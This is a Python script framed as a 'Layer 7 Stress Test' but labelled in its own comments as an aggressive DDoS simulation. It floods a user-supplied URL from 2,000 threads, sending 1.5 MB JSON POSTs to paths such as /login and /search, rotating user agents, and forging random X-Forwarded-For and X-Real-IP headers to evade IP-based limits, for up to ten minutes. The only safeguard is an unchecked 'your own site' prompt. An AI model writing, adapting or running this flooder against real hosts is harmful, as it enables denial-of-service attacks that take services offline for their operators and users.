import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from rich.console import Console
from rich.live import Live
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
import random
import json

# --- DDOS SIMULATION CONFIG (LAYER 7 AGGRESSIVE) ---
UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
]

# --- GLOBAL CONFIGURATION ---
RUNNERS_COUNT = 20 
THREADS_PER_RUNNER = 100  
REQUEST_DELAY = 0.05         
DURATION_SECONDS = 30         
MAX_DURATION = 600            
LOG_FILE = "stress_test_logs.txt"

TARGET_URL = ""              
console = Console()

# --- LAYER 7 PAYLOAD CONFIG ---
PAYLOAD_TYPE = "POST_JSON"  # Options: 'GET', 'POST_JSON'
PAYLOAD_SIZE_MB = 1.5       # Size of JSON payload in MB (for POST)
ENDPOINT_PATHS = ["/", "/api/test", "/search?q=test", "/login"]

class StressTestUI:
    def __init__(self, url):
        self.url = url.rstrip('/') + "/" if not url.endswith("/") else url
        self.total_threads = RUNNERS_COUNT * THREADS_PER_RUNNER 
        self.running = True
        self.logs = []
        self.log_lock = threading.Lock()

    def _append_log(self, entry):
        with self.log_lock:
            self.logs.append(entry)

    def generate_payload(self):
        """Generates a random JSON payload for POST requests"""
        if PAYLOAD_TYPE == "GET":
            return None
        
        # Create a dummy JSON payload of specific size (approximate via string length)
        base_data = {
            "id": random.randint(1, 9999),
            "data": "x" * int(PAYLOAD_SIZE_MB * 1024 * 1024 / 3), # Approx 3 bytes per char
            "timestamp": datetime.now().isoformat(),
            "random_key": random.choice(["a", "b", "c"])
        }
        return json.dumps(base_data)

    def send_request(self, runner_id, thread_id):
        try:
            # --- LAYER 7: Dynamic Headers (More Aggressive) ---
            headers = {
                "User-Agent": random.choice(UA_POOL),
                "Accept-Language": "en-US,en;q=0.9",
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                "X-Real-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
            }

            # --- LAYER 7: Randomize Endpoint & Method ---
            path = random.choice(ENDPOINT_PATHS)
            full_url = f"{self.url}{path}" if not self.url.endswith("/") else f"{self.url}/{path}"
            
            method = "POST" if PAYLOAD_TYPE == "POST_JSON" else "GET"

            # Pace each request
            if REQUEST_DELAY > 0:
                time.sleep(REQUEST_DELAY)

            start_time = time.time()
            
            payload = self.generate_payload()
            
            params = {}
            data = payload
            
            response = requests.request(method, full_url, headers=headers, 
                                       timeout=15, data=data if method == "POST" else None)
            
            end_time = time.time()
            duration = (end_time - start_time) * 1000

            log_entry = {
                'time': datetime.now().strftime('%H:%M:%S'),
                'runner_thread': f"{runner_id}-{thread_id}",
                'status': response.status_code,
                'duration_ms': round(duration, 2),
                'method': method,
                'path': path
            }

            self._append_log(log_entry)

        except requests.exceptions.Timeout:
            log_entry = {
                'time': datetime.now().strftime('%H:%M:%S'),
                'runner_thread': f"{runner_id}-{thread_id}",
                'status': 'TIMEOUT',
                'duration_ms': 15000,
                'method': PAYLOAD_TYPE,
                'path': random.choice(ENDPOINT_PATHS)
            }
            self._append_log(log_entry)
        except requests.exceptions.ConnectionError:
            log_entry = {
                'time': datetime.now().strftime('%H:%M:%S'),
                'runner_thread': f"{runner_id}-{thread_id}",
                'status': 'CONNECTION_ERROR',
                'duration_ms': 0,
                'method': PAYLOAD_TYPE,
                'path': random.choice(ENDPOINT_PATHS)
            }
            self._append_log(log_entry)
        except Exception as e:
            log_entry = {
                'time': datetime.now().strftime('%H:%M:%S'),
                'runner_thread': f"{runner_id}-{thread_id}",
                'status': str(e),
                'duration_ms': 0,
                'method': PAYLOAD_TYPE,
                'path': random.choice(ENDPOINT_PATHS)
            }
            self._append_log(log_entry)

    def run_test(self):
        console.print(Panel.fit("[bold blue]🖥️ Layer 7 Stress Test UI[/bold blue]\n"
                                f"[cyan]Target:[/cyan] {self.url}\n"
                                f"[yellow]Threads:[/yellow] {self.total_threads} | [blue]Delay:[/blue] {REQUEST_DELAY}s\n"
                                f"[magenta]Type:[/magenta] {PAYLOAD_TYPE}", 
                             border_style="white"))

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("({task.percentage:>3.1f}%)"),
            console=console,
            transient=False
        ) as progress:
            task = progress.add_task(f"[cyan]Running Layer 7 Test...", total=self.total_threads)

            with ThreadPoolExecutor(max_workers=self.total_threads) as executor:
                futures = [executor.submit(self.send_request, i//THREADS_PER_RUNNER, i%THREADS_PER_RUNNER) 
                           for i in range(self.total_threads)]

                # Update progress bar (simplified loop to avoid blocking)
                for _ in futures:
                    pass

            console.print(Panel.fit("[bold green]✅ Layer 7 Stress Test Complete![/bold green]", border_style="white"))

    def show_logs_live(self):
        table = Table(title="[yellow]📋 Live Logs[/yellow]")
        table.add_column("Time", style="cyan")
        table.add_column("Runner/Thread", style="magenta")
        table.add_column("Status Code", style="green")
        table.add_column("Duration (ms)", justify="right")

        with Live(table, console=console, refresh_per_second=4):
            while self.running and len(self.logs) > 0:
                table.clear()
                for log in self.logs[-100:]:
                    status_str = str(log['status'])
                    if status_str.startswith('2'):
                        status_color = "green"
                    elif 'TIMEOUT' in status_str or 'ERROR' in status_str:
                        status_color = "yellow"
                    else:
                        status_color = "red"

                    table.add_row(
                        log['time'], 
                        log['runner_thread'], 
                        f"[{status_color}]{status_str}[/]", 
                        f"{log['duration_ms']}"
                    )
                time.sleep(0.2)

    def show_logs(self):
        if not self.logs:
            console.print("[yellow]No logs to display.[/yellow]")
            return

        table = Table(title="[bold green]📋 Final Log Report[/bold green]")
        table.add_column("Time", style="cyan")
        table.add_column("Runner/Thread", style="magenta")
        table.add_column("Status Code", style="green")
        table.add_column("Duration (ms)", justify="right")

        for log in self.logs:
            status_str = str(log['status'])
            if status_str.startswith('2'):
                status_color = "green"
            elif 'TIMEOUT' in status_str or 'ERROR' in status_str:
                status_color = "yellow"
            else:
                status_color = "red"

            table.add_row(
                log['time'], 
                log['runner_thread'], 
                f"[{status_color}]{status_str}[/]", 
                f"{log['duration_ms']}"
            )

        console.print(table)

    def save_logs(self):
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"\n=== Layer 7 Stress Test Run @ {datetime.now().isoformat()} ===\n")
            f.write(f"Target: {self.url}\n")
            for log in self.logs:
                f.write(
                    f"{log['time']} | {log['runner_thread']} | "
                    f"{log['method']} | {log['status']} | {log['duration_ms']}ms\n"
                )
        console.print(f"[green]Logs saved to[/green] {LOG_FILE}")

def main():
    global TARGET_URL

    TARGET_URL = ""
    while not TARGET_URL:
        TARGET_URL = console.input("[cyan]Enter target URL (your own site): [/cyan]").strip()

    if not TARGET_URL.startswith(("http://", "https://")):
        TARGET_URL = "https://" + TARGET_URL

    ui = StressTestUI(TARGET_URL)

    console.print(Panel.fit("[bold yellow]⏱️ Duration Setting[/bold yellow]\n"
                            f"[cyan]How many seconds to run (max {MAX_DURATION}): [/cyan]",
                           border_style="white"))

    duration_input = console.input(f"Duration (seconds) [Default: {DURATION_SECONDS}]: ").strip()
    try:
        duration = int(duration_input) if duration_input else DURATION_SECONDS
    except ValueError:
        duration = DURATION_SECONDS

    if duration <= 0:
        duration = DURATION_SECONDS
    duration = min(duration, MAX_DURATION)

    start_time = time.time()

    def run_timed_loop():
        while ui.running and time.time() < start_time + duration:
            ui.run_test()
            remaining = int(start_time + duration - time.time())
            if remaining > 0:
                console.print(f"[yellow]Remaining time: {remaining} seconds...[/yellow]")

        ui.running = False

    timer_thread = threading.Thread(target=run_timed_loop)
    timer_thread.start()
    timer_thread.join()

    ui.show_logs()
    ui.save_logs()
